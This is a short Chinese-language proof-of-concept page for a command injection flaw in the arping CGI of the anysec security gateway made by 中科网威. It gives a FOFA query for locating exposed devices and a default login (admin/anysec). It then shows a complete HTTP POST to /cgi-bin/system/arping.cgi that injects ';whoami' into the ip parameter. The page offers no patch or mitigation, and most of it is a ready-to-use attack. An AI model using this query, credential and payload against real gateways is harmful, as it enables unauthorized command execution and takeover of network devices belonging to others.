# 中科网威anysec安全网关arping存在后台远程命令执行漏洞
深圳市中科网威科技有限公司是一家专注于网络安全产品研发和生产的高新技术企业。‌中科网威anysec安全网关存在arping后台远程命令执行漏洞，攻击者可利用该漏洞获取网关权限。

## fofa

```javascript
app="中科网威-anysec"
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1733735125819-6e44adad-f0c0-4cdc-bab4-d2def9afe4e6.png)

## poc
1. 使用弱口令`admin/anysec`登录系统
2. 执行命令

```java
POST /cgi-bin/system/arping.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Connection: keep-alive
Cookie: CGISID=2ZuEDPfh3Yxu6hyiAmyZpxIHymc9vSfxGJbcqhtl8RP51; sdmenu_my_menu=100000000
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

moduleid=150&tasknum=1&ip=127.0.0.1;whoami&interface=wan0&count=4&sip=8.8.8.8&x=58&y=16
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1734016663310-d6fe8c5a-89a6-47b8-b6d2-91427144aeff.png)

